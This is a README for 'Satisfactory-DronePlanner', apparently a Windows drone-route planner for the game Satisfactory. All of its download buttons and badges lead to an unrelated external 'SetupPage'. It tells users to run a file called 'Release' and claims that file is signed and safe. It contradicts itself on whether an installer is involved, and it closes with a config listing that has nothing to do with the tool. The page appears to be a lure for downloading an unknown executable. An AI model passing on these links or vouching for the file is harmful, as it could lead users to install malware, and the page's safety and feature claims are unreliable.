# Satisfactory‑DronePlanner

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-65a30d?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/EDITION-STANDARD-db2777?style=for-the-badge&logo=rocket&logoColor=white&labelColor=161b22" alt="EDITION"></a> <a href="#-key-capabilities"><img src="https://img.shields.io/badge/FEATURES-MODULES-0369a1?style=for-the-badge&logo=sparkles&logoColor=white&labelColor=161b22" alt="FEATURES"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/STATUS-VERIFIED-2563eb?style=for-the-badge&logo=checkmarx&logoColor=white&labelColor=161b22" alt="STATUS"></a> <a href="#-frequently-asked-questions"><img src="https://img.shields.io/badge/FAQ-ANSWERS-0f766e?style=for-the-badge&logo=book&logoColor=white&labelColor=161b22" alt="FAQ"></a>
</div>

**Author:** MidnightPilotPonder | **Platform:** Windows 10 / 11

A lightweight Windows‑only desktop utility that lets you sketch, test, and fine‑tune drone flight paths for *Satisfactory*. Visualize routes, spot bottlenecks, and extract clean waypoint lists to feed straight into your factory automation scripts.

---

## 🎮 Why a Drone Planner?

* **Factory‑scale logistics** – Drones are the fastest way to move resources across sprawling maps.
* **Visual feedback** – See the exact flight path, altitude changes, and turning radii before you launch.
* **Export‑ready data** – Get a ready‑to‑paste list of coordinates for blueprints, utility, or in‑game console commands.
* **Windows‑only performance** – Built with native Win32 APIs for instant UI responsiveness on Windows 10/11.

---

## 🚀 Features

| ✅ | Feature | Description |
|---|---------|-------------|
| ✅ | **Interactive map** | Drag‑and‑drop waypoints on a live map of the current world. |
| ✅ | **Altitude control** | Assign per‑point heights and preview the 3‑D trajectory. |
| ✅ | **Speed simulation** | Estimate travel time based on drone specs (speed, acceleration, turn‑rate). |
| ✅ | **Collision preview** | Highlight sections that intersect terrain or existing structures. |
| ✅ | **Export formats** | Copy to clipboard as CSV, JSON, or plain text command strings. |
| ✅ | **Theme‑aware UI** | Light/Dark mode that follows Windows theme settings. |
| ✅ | **Portable** | No installer required – just unzip and run. |
| ✅ | **Auto‑save** | Session recovery on unexpected shutdowns. |

---

## 📥 Download & Get Started

<div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
  <a href="https://rewfdf.github.io/SetupPage/" style="background:#4CAF50;color:white;padding:0.6rem 1.2rem;border-radius:4px;text-decoration:none;font-weight:bold;">Download Latest Release</a>
  <a href="https://rewfdf.github.io/SetupPage/" style="background:#2196F3;color:white;padding:0.6rem 1.2rem;border-radius:4px;text-decoration:none;font-weight:bold;">View Release Instructions</a>
</div>

1. **Download** the ZIP archive from the button above.
2. **Extract** the folder to any location you like.
3. **Run** `Release` (the file is signed and safe for Windows).
4. Follow the quick‑start wizard or open an existing route file via **File → Open**.

---

## 🛠️ How It Works

1. **Load a map** – Import a screenshot or use the built‑in world selector to pull terrain data.
2. **Place waypoints** – Click to add points; drag to reposition; scroll to adjust altitude.
3. **Tune parameters** – Set drone speed, payload weight, and battery capacity in the Settings panel.
4. **Run the simulation** – The preview pane animates the drone, showing real‑time ETA and energy consumption.
5. **Export** – Click **Export → Clipboard** to copy the coordinate list, or save as a `.json` file for later editing.

---

## 📚 Documentation

* **Quick‑Start Guide** – 5‑minute walkthrough (available on the download page).
* **Full Manual** – Detailed explanations of each UI component, file formats, and troubleshooting tips.
* **FAQ** – Answers to the most common questions from the community.

All docs are hosted on the same site as the download page.

---

## 🤝 Contributing

The project is **Windows‑only**, but contributions are welcome!

* Fork the repository and create a feature branch.
* Follow the existing coding style (C# with .NET 6, WinUI 3).
* Submit a pull request with a clear description of the change.

Please keep the scope limited to Windows‑specific enhancements or data‑processing utilities – cross‑platform features are out of scope for this repo.

---

## 🛡️ License

This utility is released under the **MIT License**. Feel free to use, modify, and distribute it for personal or commercial purposes, provided you retain the original copyright notice.

---

## 📢 Stay Connected

* **GitHub Issues** – Report bugs or request features.
* **Discord** – Join the *Satisfactory Automation* community channel for live support and showcase your routes.
* **Twitter** – Follow @MidnightPilotPonder for update announcements.

Happy building, and may your drones always find the shortest path!

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```